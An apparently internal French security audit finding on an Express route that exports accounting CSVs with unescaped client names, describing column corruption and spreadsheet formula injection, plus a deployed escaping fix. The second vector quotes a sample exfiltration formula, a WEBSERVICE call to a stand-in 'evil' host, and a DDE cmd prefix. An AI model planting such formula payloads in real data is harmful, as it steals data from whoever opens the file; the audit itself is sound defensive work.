# Audit — Export CSV comptable : cellules non échappées → corruption de structure + injection de formule

**Date** : 2026-06-12 · **Projet** : Lancement 30 juin · **Sévérité : 🟠 HIGH** · **✅ CORRIGÉ (MODE A)**

> **Fix déployé** : helper `csvCell` (numeric-aware) appliqué à chaque cellule de
> `/api/comptabilite/export-csv` (`server/_core/index.ts`) — neutralise l'injection de
> formule (préfixe `'`) et l'échappement structurel RFC 4180 (`;`/`"`/newline), tout en
> laissant montants et dates inchangés. OPE-180.

> Périmètre : route Express `GET /api/comptabilite/export-csv` (`server/_core/index.ts:670`),
> bouton « Export CSV » de la page Comptabilité (`client/src/pages/Comptabilite.tsx:83`).
> **Supersede** la conclusion de `2026-06-08-injection-csv-exports-ok.md` (désormais **périmée**).

---

## Ce qui a changé depuis le 2026-06-08

L'audit du 8 juin concluait « pas exploitable » au motif explicite que **le seul CSV vivant
était le FEC, sans free-text client** (« le nom de client ne transite par aucun CSV »). Cette
prémisse est **fausse aujourd'hui** : la route `/api/comptabilite/export-csv` (vivante, câblée au
bouton « Export CSV » de la page Comptabilité) **interpole le nom du client** directement dans le
CSV.

## Constat (`index.ts:686-695`)

```js
const csvHeader = 'Date;Numéro;Client;HT;TVA;TTC;Statut';
...
csvLines.push(`${date};${f.numero};${client?.nom || 'Client'};${fecAmount(f.totalHT)};...;${f.statut}`);
```

Les cellules `client.nom` et `f.numero` sont **concaténées brutes** avec `;` comme séparateur,
**sans aucun échappement** (pas de guillemets RFC 4180, pas de neutralisation de formule). Or
`grep csvEscape|sanitizeCsv|formula` → **0** dans tout le repo.

### Vecteur 1 — 🟠 Corruption de structure (données honnêtes, non malveillant)

Un nom de client **légitime** contenant un séparateur ou un caractère spécial casse le CSV :
- `;` (ex. raison sociale « Dupont ; Fils », « SCI A;B ») → **décale les colonnes** → dans le
  tableur du comptable, `HT/TVA/TTC/Statut` se retrouvent **désalignés** → chiffres comptables
  faux, en silence.
- `"` ou un retour-ligne dans le nom → idem (rupture de cellule/ligne).

C'est le défaut le plus grave : il touche des **données saines** et produit un **export
comptable corrompu** sans alerte, alors que ce fichier sert à la **tenue de compta / au cabinet
comptable**.

### Vecteur 2 — Injection de formule (cross-personne : artisan → comptable)

`client.nom` provient de l'artisan (`createClient`, `updateClient`, **`importFromExcel`**
`routers.ts:356`). Un nom **importé d'un CRM/Excel externe** peut contenir
`=WEBSERVICE("http://evil/?x="&A1)`, `=cmd|...`, `+`, `-`, `@…`. À l'ouverture du CSV exporté
dans **Excel/LibreOffice par le comptable** (personne distincte de l'artisan), la formule
s'exécute (exfiltration DDE/`WEBSERVICE`). L'artisan est semi-confiance, mais la **cible est son
comptable**, et la donnée transite une **frontière de personne**. → réalise le vecteur classique
que l'audit du 8 juin disait « non réalisé ».

## Impact

Export à finalité **comptable/fiscale** : (1) corruption silencieuse des montants par simple
`;`/`"`/newline dans un nom légitime, et (2) injection de formule exécutée chez le comptable.
Bloquant pour un lancement où l'export CSV alimente la compta.

## Fix proposé (~20 min, behavior-preserving pour les noms « propres »)

Ajouter un helper `csvCell(v)` appliqué à **chaque** cellule, et l'utiliser pour construire les
lignes (au lieu de la concaténation brute) :

```js
function csvCell(val) {
  let s = String(val ?? '');
  // 1) neutralisation injection de formule (Excel/LibreOffice)
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  // 2) échappement structurel RFC 4180 si ; " \n \r présents
  if (/[;"\n\r]/.test(s)) s = '"' + s.replace(/"/g, '""') + '"';
  return s;
}
```

Construire chaque ligne via `[date, f.numero, client?.nom||'Client', ...].map(csvCell).join(';')`.
Idem pour le **header** (constant, sûr). Étendre la même neutralisation au **FEC**
(`genererFEC`) **si** un libellé/`CompAuxLib` y réinjecte le nom client (à vérifier dans le
générateur unifié `a79ed88`) — cf. réserve déjà notée le 8 juin + OPE-33.

- **Behavior-preserving** : un nom sans caractère spécial et ne commençant pas par `=+-@`
  ressort **identique** ; seules les cellules à risque sont quotées/préfixées. Blast radius :
  1 route (+ FEC si concerné).

## Linear

Nouvelle issue (le sujet n'est couvert par aucune issue existante ; l'ancien audit concluait
« OK » donc **aucun ticket** n'avait été créé). Réserve de défense-en-profondeur du 8 juin
désormais **active** (free-text client présent dans un CSV vivant).
